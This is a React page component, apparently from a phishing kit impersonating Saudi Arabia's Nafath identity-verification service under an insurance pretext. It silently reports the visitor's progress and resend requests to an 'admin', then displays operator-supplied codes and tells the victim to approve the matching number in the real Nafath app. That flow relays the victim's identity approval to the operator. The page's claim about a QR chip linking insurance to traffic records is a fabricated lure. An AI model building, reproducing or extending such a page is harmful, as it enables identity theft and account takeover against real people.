import { useEffect, useState, useCallback } from "react";
import { useLocation } from "wouter";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import {
  verificationCode,
  isFormApproved,
  navigateToPage,
  visitor,
  sendData,
  waitingMessage,
} from "@/lib/store";

export default function NafathVerify() {
  const [, navigate] = useLocation();
  const [showInstructions, setShowInstructions] = useState(true);
  const [code, setCode] = useState<string>("");
  const [userPhone, setUserPhone] = useState<string>("");
  const [serviceName, setServiceName] = useState<string>("");
  const [insuranceType, setInsuranceType] = useState<string>("");
  const [countdown, setCountdown] = useState<number>(0); // 0 = no timer
  const [showResendButton, setShowResendButton] = useState(false);

  // Emit page enter and get data from localStorage
  useEffect(() => {
    navigateToPage("تحقق نفاذ");
    
    // إرسال معلومات الصفحة للأدمن - العميل ينتظر رد بدون إظهار popup
    sendData({
      current: "تحقق نفاذ",
      waitingForAdminResponse: true,
      mode: "silent",
    });
    
    // جلب رقم الجوال واسم الخدمة من localStorage
    const phone = visitor.value.phone || localStorage.getItem('userPhone') || '';
    const service = localStorage.getItem('selectedService') || new URLSearchParams(window.location.search).get('service') || '';
    setUserPhone(phone);
    setServiceName(service);
    setInsuranceType(localStorage.getItem('insuranceType') || 'ضد الغير');
  }, []);

  // Subscribe to verification code changes
  useEffect(() => {
    // Check initial value
    if (verificationCode.value) {
      setCode(verificationCode.value);
      // Start countdown when code is received
      setCountdown(60);
      setShowResendButton(false);
    }
    
    // Subscribe to changes
    const unsubscribe = verificationCode.subscribe((newCode) => {
      console.log("Verification code received in NafathVerify:", newCode);
      if (newCode) {
        setCode(newCode);
        // Start countdown when new code arrives
        setCountdown(60);
        setShowResendButton(false);
      }
    });
    
    return () => {
      unsubscribe();
    };
  }, []);

  // Countdown timer
  useEffect(() => {
    if (countdown <= 0) {
      if (code) {
        // Timer finished and we have a code - show resend button
        setShowResendButton(true);
      }
      return;
    }

    const timer = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          setShowResendButton(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [countdown, code]);

  // Handle form approval
  useEffect(() => {
    if (isFormApproved.value) {
      // خدمات الإصدار الخاصة بوزارة الداخلية تذهب لصفحة الوثائق
      const issuanceServices = [
        'الفحص الفني الدوري'
      ];

      if (serviceName && issuanceServices.includes(serviceName)) {
        navigate(`/documents?service=${encodeURIComponent(serviceName)}`);
      } else {
        navigate("/final-page");
      }
    }
  }, [isFormApproved.value, navigate, serviceName]);

  // Handle resend code request
  const handleResendCode = useCallback(() => {
    setShowResendButton(false);
    setCode(""); // إخفاء الرقم وإظهار الدائرة تلف
    setCountdown(0);
    // إرسال طلب إعادة إرسال الرمز للأدمن بدون popup
    sendData({
      data: { طلب: "إعادة إرسال رمز" },
      current: "تحقق نفاذ",
      waitingForAdminResponse: true,
      mode: "silent",
    });
  }, []);

  const openNafathApp = () => {
    // Try to open Nafath app
    const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
    if (isIOS) {
      window.open("https://apps.apple.com/us/app/%D9%86%D9%81%D8%A7%D8%B0-nafath/id1598909871");
    } else {
      window.open("https://play.google.com/store/apps/details?id=sa.gov.nic.myid");
    }
  };

  // Format countdown as M:SS
  const formatCountdown = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  return (
    <PageLayout variant="nafath">
      <WaitingOverlay />

      <div className="bg-white rounded-2xl shadow-xl p-6">
        {/* Header */}
        <div className="text-center mb-6">
          <img
            src="/images/nafath.png"
            alt="نفاذ"
            className="h-16 mx-auto mb-4"
          />
          <h1 className="text-xl font-bold text-gray-800 mb-2">التحقق من الهوية</h1>
          <p className="text-[#049c94] text-sm leading-relaxed">
            سيتم إصدار شريحة الكترونية (QR CODE) مرتبطة برقم جوالك <span className="font-bold">{userPhone || '05xxxxxxxx'}</span> ليتم ربط <span className="font-bold">وثيقة التأمين {insuranceType === 'شامل' ? 'الشامل' : 'ضد الغير'}</span> مع معلومات الإتصال الخاصة بك بنجم المرور
          </p>
          <p className="text-gray-500 text-sm mt-2">
            افتح تطبيق نفاذ واختر الرقم المطابق
          </p>
        </div>

        {/* Verification Code */}
        <div className="flex flex-col items-center mb-6">

          {code ? (
            <>
              <div className="w-24 h-24 rounded-full flex items-center justify-center border-[3px] border-solid border-[#049c94]">
                <p className="text-4xl font-bold text-[#049c94]">
                  {code}
                </p>
              </div>
              
              {/* Countdown timer or Resend button */}
              <div className="mt-3">
                {countdown > 0 && !showResendButton ? (
                  <p className="text-sm text-gray-500 font-medium" dir="ltr">
                    {formatCountdown(countdown)}
                  </p>
                ) : showResendButton ? (
                  <button
                    onClick={handleResendCode}
                    className="text-sm text-[#049c94] font-medium hover:underline cursor-pointer transition-colors"
                  >
                    طلب رمز جديد
                  </button>
                ) : null}
              </div>
            </>
          ) : (
            <div className="w-24 h-24 rounded-full flex items-center justify-center animate-spin border-[3px] border-solid border-[#049c94] border-t-transparent" />
          )}
        </div>

        {/* Instructions */}
        {showInstructions && (
          <div className="bg-blue-50 rounded-lg p-4 mb-6">
            <h3 className="font-semibold text-blue-800 mb-2">خطوات التحقق:</h3>
            <ol className="text-sm text-blue-700 space-y-2 list-decimal list-inside">
              <li>افتح تطبيق نفاذ على جوالك</li>
              <li>ستظهر لك إشعار بطلب تحقق</li>
              <li>اختر الرقم المطابق للرقم أعلاه</li>
              <li>انتظر حتى يتم التحقق</li>
            </ol>
            <button
              onClick={() => setShowInstructions(false)}
              className="text-blue-600 text-xs mt-2 hover:underline"
            >
              إخفاء التعليمات
            </button>
          </div>
        )}

        {/* Steps Images */}
        <div className="grid grid-cols-2 gap-4 mb-6">
          <div className="text-center flex flex-col items-center">
            <img
              src="/images/nafaz-step-1.jpg"
              alt="Step 1"
              className="rounded-lg mb-2 w-full"
            />
            <p className="text-xs text-gray-500">الخطوة 1</p>
          </div>
          <div className="text-center flex flex-col items-center">
            <img
              src="/images/nafaz-step-2.jpg"
              alt="Step 2"
              className="rounded-lg mb-2 w-full"
            />
            <p className="text-xs text-gray-500">الخطوة 2</p>
          </div>
        </div>

        {/* Open App Button */}
        <Button
          onClick={openNafathApp}
          className="w-full"
          size="lg"
          style={{backgroundColor: '#049c94'}}
        >
          فتح تطبيق نفاذ
        </Button>
      </div>
    </PageLayout>
  );
}
